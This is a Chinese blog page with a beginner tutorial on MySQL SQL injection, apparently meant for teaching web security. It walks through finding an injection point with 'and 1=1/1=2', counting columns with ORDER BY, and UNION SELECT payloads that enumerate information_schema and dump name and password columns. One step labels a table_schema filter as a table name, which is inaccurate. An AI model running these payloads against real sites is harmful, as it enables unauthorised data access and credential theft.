<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>web安全之简要sql注入 - 编程大咖</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:url" content="https://bcdaka.github.io/posts/cc38b932a61bb92e6b35705169773e90/">
  <meta property="og:site_name" content="编程大咖">
  <meta property="og:title" content="web安全之简要sql注入">
  <meta property="og:description" content="SQL注入原理：可控变量，带入数据库查询，变量中未存在过滤或者过滤不严谨 如何判断注入点？（以下数据库类型为mysql） 老办法：
and 1=1 页面正常
and 1=2 页面错误
可能存在注入点
但是要选用最舒服的方法去测试！
讲一下老方法的原理
select * from users where id=1 and 1=1，正常
select * from users where id=1 and 1=2，错误
前面都是正确的语句，区别在于后面。
如果是1=1，那么就是真且真，结果为真
如果是1=2，那么就是真且假，结果为假
就是说你所自定义的1=1或者1=2，被网站正常执行到了，所以就存在注入点
那么我们就可以自定义一些sql语句，获取数据库的数据，写sql语句可以用到联合查询UNION这个关键字
操作流程如下：
1.判断注入 2.猜测列名数量（字段数），一般用order by去猜 select * from users where id=1 order by (1~n)，直到页面不正常即为字段数，比如4正常，5不正常，则字段数为4。
3.猜解准备 select * from users where id=-1 union select 1,2,3,4，正常
注意：id=-1，让前面的语句为错误语句，即可只执行后面的语句，这样的作用是看下哪几列数据可以显示出来，然后将能显示的替换成注入语句即可
4.信息收集 数据库版本：version()
数据库名称：database()
数据库用户：user()
操作系统：@@version_compile_o s
比如说正常显示2和3，那就可以写
select * from users where id=-1 union select 1,database(),version(),4">
  <meta property="og:locale" content="zh_CN">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2024-08-01T03:05:27+08:00">
    <meta property="article:modified_time" content="2024-08-01T03:05:27+08:00">

	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
  


</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程大咖" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程大咖</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">web安全之简要sql注入</h1>
			
		</header>
		<div id="gatop"></div>
		<div class="content post__content clearfix">
			
<div id="content_views" class="htmledit_views">
                    <p><img alt="" height="649" src="https://images2.imgbox.com/03/b0/HqmUuvZF_o.png" width="648"></p> 
<h3><strong>SQL注入原理：可控变量，带入数据库查询，变量中未存在过滤或者过滤不严谨</strong></h3> 
<h4>如何判断注入点？（以下数据库类型为mysql）</h4> 
<p>老办法：</p> 
<p>and 1=1 页面正常</p> 
<p>and 1=2 页面错误</p> 
<p>可能存在注入点</p> 
<p><span style="background-color:#ffd900;">但是要选用最舒服的方法去测试！</span></p> 
<p>讲一下老方法的原理</p> 
<p>select * from users where id=1 and 1=1，正常</p> 
<p>select * from users where id=1 and 1=2，错误</p> 
<p>前面都是正确的语句，区别在于后面。</p> 
<p>如果是1=1，那么就是真且真，结果为真</p> 
<p>如果是1=2，那么就是真且假，结果为假</p> 
<p><span style="background-color:#ffd900;">就是说你所自定义的1=1或者1=2，被网站正常执行到了，所以就存在注入点</span></p> 
<p>那么我们就可以自定义一些sql语句，获取数据库的数据，写sql语句可以用到联合查询UNION这个关键字</p> 
<h4>操作流程如下：<br> 1.判断注入</h4> 
<h4>2.猜测列名数量（字段数），一般用order by去猜</h4> 
<p>        select * from users where id=1 order by (1~n)，<span style="background-color:#ffd900;">直到页面不正常即为字段数，比如4正常，5不正常，则字段数为4。</span></p> 
<h4> 3.猜解准备</h4> 
<p>         select * from users where id=-1 union select 1,2,3,4，正常</p> 
<p>        注意：id=-1，让前面的语句为错误语句，即可只执行后面的语句，这样的<span style="background-color:#ffd900;">作用是看下哪几列数据可以显示出来，然后将能显示的替换成注入语句</span>即可</p> 
<h4>4.信息收集</h4> 
<p>数据库版本：version()</p> 
<p>数据库名称：database()</p> 
<p>数据库用户：user()</p> 
<p>操作系统：@@version_compile_o s</p> 
<p>比如说正常显示2和3，那就可以写</p> 
<p> select * from users where id=-1 union select 1,database(),version(),4</p> 
<h4>5.查询指定数据库名下的表名信息</h4> 
<p>如果是mysql5.0以上，则存在information_schema，其中存储所有数据库名，表名，列名的数据库，也相当于可以通过查询它获取指定数据库下面的表名或列名信息。</p> 
<p> information_schema.tables：记录所有表名信息的表</p> 
<p>information_schema.columns：记录所有列名信息的表</p> 
<p>table_name：表名</p> 
<p>column_name：列名</p> 
<p>table_schema：数据库名</p> 
<p>举例：select * from users where id=-1 union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema='这里写数据库名称'</p> 
<p><span style="background-color:#ffd900;">group_concat()是把多行结果并作一行显示</span> </p> 
<h4>6.查询指定表名下的列名信息</h4> 
<p>select * from users where id=-1 union select 1,column_name,3,4 from information_schema.columns where table_schema='这里写表名'</p> 
<h4><strong>7.查询指定数据</strong></h4> 
<p> select * from users where id=-1 union select 1,name,password,4 from 表名</p> 
<p></p>
                </div>
		</div>
		<div id="gabottom"></div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/a619ff796418ede1392a80f19ebabfc6/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">【C&#43;&#43;标准库】介绍及使用string类</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/cc3c9354421860c2c1a0277bb97205ad/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">Flink-StarRocks详解:第二部分(第52天)</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程大咖.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://www.w3counter.com/tracker.js?id=151347"></script>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>